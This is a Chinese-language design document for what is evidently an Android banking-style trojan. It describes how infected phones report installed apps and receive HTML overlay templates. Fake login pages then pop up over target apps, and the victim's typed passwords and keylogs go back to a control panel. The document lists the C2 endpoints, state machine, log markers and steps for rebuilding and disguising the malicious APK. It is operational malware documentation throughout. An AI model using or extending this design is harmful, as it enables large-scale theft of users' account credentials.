# 注入协议与状态机（3.5）

## 一句话

设备装包 → 上报已装应用 → 服务器比对后**一次性下发**注入配置（HTML 模板 URL）→
设备拿到即就绪并回执「已注入」→ 用户打开目标 App 输入密码 → 上报「已提交」。

## 时序

```
① 安装 / 上线
   设备: POST /ws 连接 → deviceOnline（含 apkId/version）
   设备: 上报 appList（已装应用清单）

② 服务器比对
   api_impl.inject_batch_items(deviceId)
     = inject_settings 里 enabled=true
       ∩ 该设备已安装
       ∩ 未被人工跳过
   产出 items: [{pkg, url(模板), name, cc, fullscreen}]

③ 一次性下发（面板状态 → 等待中）
   服务端: send_command(dev, 'injectBatch', {items, count})
   状态落库: inj_state.result = 'dispatched'   → 面板显示「等待中」
   触发点：
     · 设备上报 appList 后自动触发（同设备 120 秒节流，见 _INJECT_PUSH_AT）
     · 面板「重注」→ reset + 再下发（同样落 dispatched）
     · 手动: POST /api/device-inject-push {"deviceId": "..."}

④ 设备收到 → 就绪并回执（面板状态 → 已注入）
   设备: InjectRepo.applyPushed(items) → 写入配置 + prefetchAll() 下载 HTML 到本地
   设备: channel.send("action_result", {action:"injectBatch", success:true, applied:N})
   服务端: 把该设备这批 dispatched 包改成 'injected' → 面板显示「已注入」

⑤ 用户打开 App 输入密码（面板状态 → 已提交）
   设备: 前台包命中 → InjectionActivity 弹本地 HTML
   页面: FKB.setFormData(json) → 原生桥 → POST /api/inj/result
   服务端: 记录 keylogs/表单 → 面板显示「已提交」

⑥ 人工跳过
   面板「跳过」→ /api/device-inject-track/skip → result='skipped' → 「已跳过」
```

## 状态取值（inj_state.result）

| 值 | 面板显示 | 谁写入 | 含义 |
|---|---|---|---|
| `''`（空） | 等待中 | 初始 | 已匹配，尚未下发 |
| `dispatched` | 等待中 | 服务端下发时 | 配置/重注请求已下发，等设备回执 |
| `injected` | 已注入 | 设备回执时 | 设备已拿到配置与 HTML，就绪 |
| `submitted` | 已提交 | 用户提交表单时 | 已收到输入的账号/密码等 |
| `skipped` | 已跳过 | 面板操作 | 不再自动注入该包 |

## 接口清单

| 接口 | 方向 | 用途 |
|---|---|---|
| `GET /api/device-inject-settings?deviceId=&country=` | 设备拉取 | 配置兜底（下拉式，仍保留） |
| `POST /api/device-inject-push` | 面板 → 服务端 | 手动一次性下发 |
| `WS action=injectBatch` | 服务端 → 设备 | 批量下发配置（含模板 URL） |
| `WS action=action_result{action:injectBatch}` | 设备 → 服务端 | 回执（→ 已注入） |
| `POST /api/device-inject-track/{inject,reset,skip,ack}` | 双向 | 单包状态变更 |
| `POST /api/inj/result` | 设备（原生桥） | 表单数据上报（→ 已提交） |
| `GET /inject/file/<国家目录>/<包名>.html` | 设备 | 模板 HTML（支持子目录） |

## 日志关键字（排查用）

```
[server] injectBatch(auto) -> <dev> (N items)      下发成功
[server] injectBatch ready <dev> (N pkgs -> injected)   收到回执
[server] injectBatch ack failed / auto injectBatch skipped
设备: InjectRepo applyPushed / prefetch ok: <pkg>
```

## 注意

- 「打开」按钮只是 `startApk` 快捷拉起 App，与注入无直接关系；
  若该包已配置且未注入过，App 到前台会自动弹注入页。
- 页面提交**只允许**走原生桥（FKB/Android），服务端忽略网页来源 POST。

---

## 仓库与出包策略（2026-11 起）

```
仓库只保留源码：apk-project/versions/4.0-src（Kotlin 源码）、server/、web/panel、materials/inject、
                tools/ 脚本、docs/
APK 产物一律不入库：materials/templates/*.apk、release/**/*.apk、build/*.apk（.gitignore 已屏蔽）

出包两条路：
  A. 本地：gradle assembleRelease → 上传服务器 materials/templates/v3.5.apk
  B. 源码构建（推荐）：服务器 materials/src/v3.5 是 apktool 工程，
     面板选「v3.5 源码构建」模板即可改名字/图标/包名/首页后编译；
     代码有改动时先本地出包，再在服务器执行
       bash tools/make_src_project.sh <新apk> materials/src/v3.5
     刷新源码工程（仓库里不需要存这个 16M 工程）
```
